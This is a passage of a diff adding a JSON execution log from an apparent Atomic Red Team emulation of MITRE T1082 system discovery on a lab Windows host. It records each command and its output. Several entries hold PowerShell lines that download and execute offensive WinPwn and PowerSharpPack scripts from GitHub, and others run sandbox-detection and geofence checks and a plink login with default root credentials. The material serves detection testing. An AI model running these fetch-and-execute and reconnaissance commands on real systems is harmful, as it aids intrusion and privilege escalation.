+                           "procedure-description":  "Identify system information with the WMI command-line (WMIC) utility. Upon execution, various system information will be displayed, including: OS, CPU, GPU, and disk drive names; memory capacity; display resolution; and baseboard, BIOS, and GPU driver products/versions.\nhttps://nwgat.ninja/getting-system-information-with-wmic-on-windows/\nElements of this test were observed in the wild used by Aurora Stealer in late 2022 and early 2023, as highlighted in public reporting:\nhttps://blog.sekoia.io/aurora-a-rising-stealer-flying-under-the-radar\nhttps://blog.cyble.com/2023/01/18/aurora-a-stealer-using-shapeshifting-tactics/\n",
+                           "order":  27,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:52.000Z",
+                                             "time-stop":  "2024-10-12T18:07:52.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "wmic cpu get name\nwmic MEMPHYSICAL get MaxCapacity\nwmic baseboard get product\nwmic baseboard get version\nwmic bios get SMBIOSBIOSVersion\nwmic path win32_VideoController get name\nwmic path win32_VideoController get DriverVersion\nwmic path win32_VideoController get VideoModeDescription\nwmic OS get Caption,OSArchitecture,Version\nwmic DISKDRIVE get Caption\nGet-WmiObject win32_bios\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "Name                           \r\nQEMU Virtual CPU version 2.5+  \r\nMaxCapacity  \r\n8388608      \r\nSMBIOSBIOSVersion  \r\n4.2023.08-4        \r\nName                             \r\nMicrosoft Basic Display Adapter  \r\nDriverVersion  \r\n10.0.22000.1   \r\nVideoModeDescription            \r\n1280 x 800 x 4294967296 colors  \r\nCaption                   OSArchitecture  Version     \r\nMicrosoft Windows 11 Pro  64-bit          10.0.22000  \r\nCaption        \r\nQEMU HARDDISK",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            },
+                                                            {
+                                                                "content":  "No Instance(s) Available.\r\nNo Instance(s) Available.\r\nGet-WmiObject is not recognized as an internal or external command,\r\noperable program or batch file.",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "Check computer location",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "96be6002-9200-47db-94cb-c3e27de1cb36"
+                                            },
+                           "procedure-description":  "Looks up country code configured in the registry, likely geofence. Upon execution, country code info will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n",
+                           "order":  29,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:09:02.000Z",
+                                             "time-stop":  "2024-10-12T18:09:02.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "reg query \"HKEY_CURRENT_USER\\Control Panel\\International\\Geo\"\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "HKEY_CURRENT_USER\\Control Panel\\International\\Geo\r\n    Nation    REG_SZ    244\r\n    Name    REG_SZ    US",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - RBCD-Check",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "dec6a0d8-bcaf-4c22-9d48-2aee59fb692b"
+                                            },
+                           "procedure-description":  "Search for Resource-Based Constrained Delegation attack paths using RBCD-Check function of WinPwn",
+                           "order":  20,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:19.000Z",
+                                             "time-stop":  "2024-10-12T18:07:22.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\nRBCD-Check -consoleoutput -noninteractive",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nRBCD-Check : The term RBCD-Check is not recognized as the name of a cmdlet, function, script file, or operable \r\nprogram. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\nAt line:3 char:1\r\n+ RBCD-Check -consoleoutput -noninteractive}\r\n+ ~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (RBCD-Check:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - winPEAS",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "eea1d918-825e-47dd-acc2-814d6c58c0e1"
+                                            },
+                           "procedure-description":  "Discover Local Privilege Escalation possibilities using winPEAS function of WinPwn",
+                           "order":  14,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:30.000Z",
+                                             "time-stop":  "2024-10-12T18:06:35.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "$S3cur3Th1sSh1t_repo=https://raw.githubusercontent.com/S3cur3Th1sSh1t\niex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1)\nwinPEAS -noninteractive -consoleoutput",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ #  Global TLS Setting for all functions. If TLS12 isnt suppported yo ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:2 char:1\r\n+ iex(new-object net.webclient).downloadstring(https://raw.githubuserc ...\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nwinPEAS : The term winPEAS is not recognized as the name of a cmdlet, function, script file, or operable program. \r\nAt line:3 char:1\r\n+ winPEAS -noninteractive -consoleoutput}\r\nCheck the spelling of the name, or if a path was included, verify that the path is correct and try again.\r\n+ ~~~~~~~\r\n    + FullyQualifiedErrorId : CommandNotFoundException\r\n    + CategoryInfo          : ObjectNotFound: (winPEAS:String) [], CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "efb79454-1101-4224-a4d0-30c9c8b29ffc"
+                                            },
+                           "procedure-description":  "PowerSharpPack - Sharpup checking common Privesc vectors technique via function of WinPwn - Takes several minutes to complete.",
+                           "order":  22,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:07:35.000Z",
+                                             "time-stop":  "2024-10-12T18:07:38.000Z",
+                                             "executor":  "powershell",
+                                             "command":  "iex(new-object net.webclient).downloadstring(https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpUp.ps1)\nInvoke-SharpUp -command \"audit\"",
+                                             "output":  [
+                                                            {
+                                                                "content":  "iex : At line:1 char:1\r\n+ function Invoke-SharpUp\r\n+ ~~~~~~~~~~~~~~~~~~~~~~~\r\nThis script contains malicious content and has been blocked by your antivirus software.\r\nAt line:1 char:4\r\n+  {iex(new-object net.webclient).downloadstring(https://raw.githubus ...\r\n+    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException\r\n    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand\r\n \r\nInvoke-SharpUp : The term Invoke-SharpUp is not recognized as the name of a cmdlet, function, script file, or \r\noperable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try \r\nagain.\r\nAt line:2 char:1\r\n+ Invoke-SharpUp -command \"audit\"}\r\n+ ~~~~~~~~~~~~~~\r\n    + CategoryInfo          : ObjectNotFound: (Invoke-SharpUp:String) [], CommandNotFoundException\r\n    + FullyQualifiedErrorId : CommandNotFoundException",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "BIOS Information Discovery through Registry",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "f2f91612-d904-49d7-87c2-6c165d23bead"
+                                            },
+                           "procedure-description":  "Looks up for BIOS information in the registry. BIOS information is often read in order to detect sandboxing environments.  Upon execution, BIOS information will be displayed.\n- https://tria.ge/210111-eaz8mqhgh6/behavioral1\n- https://evasions.checkpoint.com/techniques/registry.html\n",
+                           "order":  30,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:09:06.000Z",
+                                             "time-stop":  "2024-10-12T18:09:06.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "reg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v SystemBiosVersion\nreg query HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System /v VideoBiosVersion\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\r\n    SystemBiosVersion    REG_MULTI_SZ    BOCHS  - 1\\04.2023.08-4\\0Proxmox distribution of EDK II - 10000",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            },
+                                                            {
+                                                                "content":  "ERROR: The system was unable to find the specified registry key or value.",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "Environment variables discovery on windows",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "f400d1c0-1804-4ff8-b069-ef5ddd2adbf3"
+                                            },
+                           "procedure-description":  "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
+                           "order":  11,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:06:26.000Z",
+                                             "time-stop":  "2024-10-12T18:06:26.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "set\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "ALLUSERSPROFILE=C:\\ProgramData\r\nAPPDATA=C:\\Users\\edrba\\AppData\\Roaming\r\nCommonProgramFiles=C:\\Program Files\\Common Files\r\nCommonProgramFiles(x86)=C:\\Program Files (x86)\\Common Files\r\nCommonProgramW6432=C:\\Program Files\\Common Files\r\nCOMPUTERNAME=REDSHIRT\r\nComSpec=C:\\Windows\\system32\\cmd.exe\r\nDriverData=C:\\Windows\\System32\\Drivers\\DriverData\r\nHOMEDRIVE=C:\r\nHOMEPATH=\\Users\\edrba\r\nLOCALAPPDATA=C:\\Users\\edrba\\AppData\\Local\r\nLOGONSERVER=\\\\REDSHIRT\r\nNUMBER_OF_PROCESSORS=4\r\nOneDrive=C:\\Users\\edrba\\OneDrive\r\nOneDriveConsumer=C:\\Users\\edrba\\OneDrive\r\nOS=Windows_NT\r\nPath=C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\edrba\\AppData\\Local\\Microsoft\\WindowsApps\r\nPATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL\r\nPROCESSOR_ARCHITECTURE=AMD64\r\nPROCESSOR_IDENTIFIER=Intel64 Family 15 Model 107 Stepping 1, GenuineIntel\r\nPROCESSOR_REVISION=6b01\r\nProgramData=C:\\ProgramData\r\nProgramFiles=C:\\Program Files\r\nProgramFiles(x86)=C:\\Program Files (x86)\r\nProgramW6432=C:\\Program Files\r\nPROMPT=$P$G\r\nPSExecutionPolicyPreference=Bypass\r\nPSModulePath=C:\\Users\\edrba\\OneDrive\\Documents\\WindowsPowerShell\\Modules;C:\\Program Files\\WindowsPowerShell\\Modules;C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\r\nPUBLIC=C:\\Users\\Public\r\nSystemDrive=C:\r\nSystemRoot=C:\\Windows\r\nTEMP=C:\\Users\\edrba\\AppData\\Local\\Temp\r\nTMP=C:\\Users\\edrba\\AppData\\Local\\Temp\r\nUSERDOMAIN=REDSHIRT\r\nUSERDOMAIN_ROAMINGPROFILE=REDSHIRT\r\nUSERNAME=edrba\r\nUSERPROFILE=C:\\Users\\edrba\r\nwindir=C:\\Windows\r\nPROCESSOR_LEVEL=15",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "Check OS version via \"ver\" command",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "f6ecb109-df24-4303-8d85-1987dbae6160"
+                                            },
+                           "procedure-description":  "Ver command shows information about os version.",
+                           "order":  35,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:09:30.000Z",
+                                             "time-stop":  "2024-10-12T18:09:30.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "ver",
+                                             "output":  [
+                                                            {
+                                                                "content":  "Microsoft Windows [Version 10.0.22000.2538]",
+                                                                "level":  "STDOUT",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       },
+                       {
+                           "mitre-technique-id":  "T1082",
+                           "procedure-name":  "ESXi - Darkside system information discovery",
+                           "procedure-id":  {
+                                                "type":  "guid",
+                                                "id":  "f89812e5-67d1-4f49-86fa-cbc6609ea86a"
+                                            },
+                           "procedure-description":  "Darkside ransomware utilises various ESXCLI commands to obtain information about the ESXi Host.\n[Reference](https://www.trendmicro.com/en_ph/research/21/e/darkside-linux-vms-targeted.html)\n",
+                           "order":  32,
+                           "steps":  [
+                                         {
+                                             "order":  1,
+                                             "time-start":  "2024-10-12T18:09:18.000Z",
+                                             "time-stop":  "2024-10-12T18:09:21.000Z",
+                                             "executor":  "command_prompt",
+                                             "command":  "echo \"\" | \"C:\\AtomicRedTeam\\atomics\\..\\ExternalPayloads\\plink.exe\" \"atomic.local\" -ssh  -l \"root\" -pw \"pass\" -m \"C:\\AtomicRedTeam\\atomics\\T1082\\src\\esx_darkside_discovery.txt\"\n",
+                                             "output":  [
+                                                            {
+                                                                "content":  "Unable to open connection:\r\nHost does not exist",
+                                                                "level":  "STDERR",
+                                                                "type":  "console"
+                                                            }
+                                                        ]
+                                         }
+                                     ]
+                       }
+                   ],
+    "execution-data":  {
+                           "execution-source":  "T1082",
+                           "target":  {
+                                          "host":  "REDSHIRT",
+                                          "ip":  "10.0.2.100",
+                                          "path":  "C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Windows\\System32\\OpenSSH\\;C:\\Users\\edrba\\AppData\\Local\\Microsoft\\WindowsApps",
+                                          "user":  "edrba"
+                                      },
+                           "execution-command":  "T1082",
+                           "time-generated":  "2024-10-12T18:13:40.7296377+00:00",
+                           "execution-category":  {
+                                                      "name":  "Atomic Red Team",
+                                                      "abbreviation":  "art"
+                                                  },
+                           "execution-id":  "0c7da87b-9228-46f8-bc7d-d891b6c71fa5"
+                       },
+    "attire-version":  "1.1"
+}
